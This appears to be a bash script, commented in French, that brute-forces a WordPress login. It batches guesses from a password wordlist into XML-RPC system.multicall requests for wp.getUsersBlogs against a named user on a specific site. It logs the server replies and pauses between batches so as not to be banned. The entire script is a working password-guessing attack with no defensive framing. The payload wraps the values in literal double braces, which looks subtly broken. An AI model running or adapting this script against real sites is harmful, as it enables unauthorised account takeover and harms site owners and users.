#!/bin/bash

# Fichier contenant la liste de mots
wordlist="./dic01.txt"

utilisateur="laurentbrayard"
xml_blocks=""
batch_size=100
count=0

send_request() {
  local blocks=$1
  curl -X POST --location "https://ir-press.ru/xmlrpc.php" --header "Content-Type: application/xml" --data "<?xml version='1.0'?> <methodCall><methodName>system.multicall</methodName><params><param><value><array><data> $blocks </data></array></value></param></params></methodCall>" > temp_logs.txt
cat temp_logs.txt >> logs-ir.txt
cat temp_logs.txt
echo .
  sleep 120   ## temporisation de 120 secondes : a ajuster pour ne pas se faire bannir
}

# Lire chaque mot du fichier
while IFS= read -r word; do
  # Ajouter un bloc XML pour chaque mot
  xml_blocks+="<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{{ $utilisateur }}</string></value><value><string>{{ $word }}</string></value></data></array></value></data></array></value></member></struct></value>"
  echo $word
  count=$((count + 1))

  # Si le batch est complet, envoyer la requête et réinitialiser les variables
  if [ $count -eq $batch_size ]; then
    send_request "$xml_blocks"
    xml_blocks=""
    count=0
  fi
done < "$wordlist"

# Envoyer la dernière requête si elle n'a pas été envoyée
if [ $count -gt 0 ]; then
  send_request "$xml_blocks"
fi
